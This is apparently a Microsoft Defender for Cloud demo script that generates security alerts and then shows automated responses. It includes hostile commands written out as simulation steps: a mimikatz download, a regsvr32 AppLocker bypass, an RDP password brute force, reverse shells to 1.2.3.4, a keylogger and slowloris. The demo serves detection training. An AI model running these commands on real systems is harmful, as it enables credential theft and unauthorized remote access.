# Infrastructure demo

## Posture management - secure score, best practicies, vulnerabilities
### Vulnerabilities
Check vulnerabilities found in VMs (by Qualys engine), container images, storage accounts, recommended security configurations.

### Policies - VMs, Kubernetes, Policy as Code
- Explain policy as code principles
- In policy definitions show examples:
    - Azure policy -> search for:
        - locations
        - backup
        - encrypt
        - firewall
        - logs
    - OS level policies -> search for audit
    - Containers and Kubernetes policies -> search for container
- Search for initiatives such as ISO 27001
- Remediations
- Blueprints

## Threat protection and automation

### Windows Host level protection
```powershell
Invoke-AzVMRunCommand -ResourceGroupName 'azdefender' -VMName 'azdefender-vm' -CommandId 'RunPowerShellScript' -ScriptPath 'scripts/infraAttackSimulationFromWindows.ps1' 
```


Search for alerts such as suspicious process or RDP attack.

To generate some alerts, you can run the following on monitored VM.

```powershell
# Create file with malware test content
'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | Out-File EICAR.com

# Copy svchost.exe to non-standard location and execute it
Copy-Item -Path C:\Windows\System32\svchost.exe C:\
C:\svchost.exe

# Download and expand mimikatz
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip","c:\install\mimikatz_trunk.zip")
cd c:\install
Expand-Archive -LiteralPath 'c:\install\mimikatz_trunk.zip'

# Attempt to bypass App Locker
echo '<?XML version="1.0"?>' | Out-File test.sct
echo '<scriptlet>' | Out-File -Append test.sct
echo '<registration' | Out-File -Append test.sct
echo ' progid="TESTING"' | Out-File -Append test.sct
echo ' classid="{A1112221-0000-0000-3000-000DA00DABFC}" >' | Out-File -Append test.sct
echo ' <script language="JScript">' | Out-File -Append test.sct
echo ' <![CDATA[' | Out-File -Append test.sct
echo ' var foo = new ActiveXObject("WScript.Shell").Run("powershell.exe InvokeWebRequest -OutFile eicar.com http://www.eicar.org/download/eicar.com");' | Out-File -Append test.sct
echo ' ]]>' | Out-File -Append test.sct
echo '</script>' | Out-File -Append test.sct
echo '</registration>' | Out-File -Append test.sct
echo '</scriptlet>' | Out-File -Append test.sct
regsvr32.exe /s /u /i:test.sct scrobj.dll
```

From Linux machine initiate RDP brute force attack. 

```bash
# Download 500 worst passwords dictionary
wget http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2
bzip2 -d 500-worst-passwords.txt.bz2

# Install crowbar and run RDP dictionary attack
sudo apt install -y ubuntu-desktop nmap openvpn freerdp-x11 tigervnc-viewer python3 python3-pip

git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt

./crowbar.py -b rdp -u administrator -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n1
./crowbar.py -b rdp -u tomas -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n 1
./crowbar.py -b rdp -u tomas -c Azure12345678 -s 10.0.0.4/32 -v -D -n 1
```

Use automation to isolate RDP access (Logic App with NSG). Before running this demo go to connectors or inside Logic App and authorize connections to Office365.

1. Open Alert that includes attacker IP (eg. RDP brute force attack)
2. In portal show VM blade with Networking - RDP from inside VNET is allowed without restrictions
3. Take action on alert by invoking isolateVm Logic App
4. Check VM blade again for blocking rule on Networking
5. You will also receive email message

As preventive measure consider no direct access to machines at all, only privileged access workstation (jump server) such as Azure Bastion. Configure Network Security Group to enable RDP access only from Bastion service and demonstrate Bastion via browser on Azure portal.

```powershell
$resourceGroupName = "azdefender"
$nsgName="azdefender-nsg"
$bastionSourceRange="10.0.1.0/24"

# Get the NSG resource
$nsg = Get-AzNetworkSecurityGroup -Name $nsgName -ResourceGroupName $resourceGroupName

# Add the inbound security rule to allow RDP from Bastion subnet
$nsg | Add-AzNetworkSecurityRuleConfig -Name "AllowRdpFromBastion" -Description "Allow RDP from Bastion subnet" -Access Allow `
    -Protocol Tcp -Direction Inbound -Priority 150 -SourceAddressPrefix $bastionSourceRange -SourcePortRange * `
    -DestinationAddressPrefix * -DestinationPortRange 3389

# Add the inbound security rule to deny all other RDP access
$nsg | Add-AzNetworkSecurityRuleConfig -Name "DenyAllRdp" -Description "Deny all RDP access" -Access Deny `
    -Protocol Tcp -Direction Inbound -Priority 151 -SourceAddressPrefix "*" -SourcePortRange * `
    -DestinationAddressPrefix * -DestinationPortRange 3389

# Update the NSG.
$nsg | Set-AzNetworkSecurityGroup
```

### Linux Host level protection
Generate suspicious activity on Linux VM.

```bash
# Attempt to create revese shell
nc -e /bin/bash 1.2.3.4 1234
bash -i>& /dev/tcp/1.2.3.4/1234 0>&1

# Add and remove kernel module
# sudo insmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
# sudo rmmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 

# Run questionable tools
logkeys --start
perl slowloris.pl -dns server.contoso.com

# Store malware file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./EICAR.com
```

Check alert in Azure Defender.

### Storage protection
As per demo install instructions (README.md) we have already uploaded EICAR test malware file to blob storage.

Before running this demo go to connectors or inside Logic App and authorize connections to Office365.

Demonstrate blob malware automation:
1. Open alerts that malware was detected in Blob Storage
2. Open Blob Storage and show files is there
3. Click on alert and take action by executing azdefenderDeleteBlob Logic App
4. You will receive email - click on delete button
5. Show file has been deleted, yet is recoverable due to Soft Delete feature
6. Show confirmation email

### Kubernetes protection
Open Azure Cloud Shell (bash) and install few resources that run privileged container, create new highly privileged role and create new cluster-role binding on admin.

```powershell
$resourceGroupName = "azdefender"
Import-AzAksCredential -ResourceGroupName $resourceGroupName -Name $(Get-AzResourceGroupDeployment -ResourceGroupName $resourceGroupName -Name azdefender-infra).outputs.kubeName.Value -Force

kubectl apply -f https://raw.githubusercontent.com/tkubica12/azdefender-demo/master/kubernetes/resources.yaml 
```

After some time check alerts in Azure Defender.

